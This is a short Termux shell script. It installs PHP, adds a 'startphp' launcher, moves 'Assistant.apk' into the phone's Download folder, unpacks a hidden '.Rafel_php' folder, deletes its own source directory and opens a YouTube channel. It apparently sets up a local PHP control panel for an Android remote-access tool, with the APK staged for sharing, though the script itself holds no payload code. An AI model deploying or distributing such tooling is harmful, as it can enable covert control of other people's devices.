#!/usr/bin/env bash
clear
# Print banner
echo ""
echo -e "\e[33m please waiting for Setup ....[\e[92m✓\e[34m]\e[92m"

echo ""
echo -e "\033[32m░CREATE░ ░B░Y░ ░M░A░H░A░D░E░B ░R░U░I░D░A░S░\033[0m"

pkg update && pkg upgrade -y
pkg install -y php
chmod +x startphp
mv startphp $PREFIX/bin/
mv Assistant.apk /storage/emulated/0/Download/
unzip Local_php.zip
mv .Rafel_php $HOME
cd
echo -e "\e[92m Installed Successfully and type startphp[\e[34m✓\e[92m]\e[34m"
echo ""
echo -e "\e[92m~\e[0m $ .....\e[92mSUBSCRIBE My YOUTUBE Channel\e[0m.....\e[94m[\e[92m✓\e[94m]\e[0m"
rm -rf PHP_Localhost
termux-open-url https://youtube.com/@zerodarknexus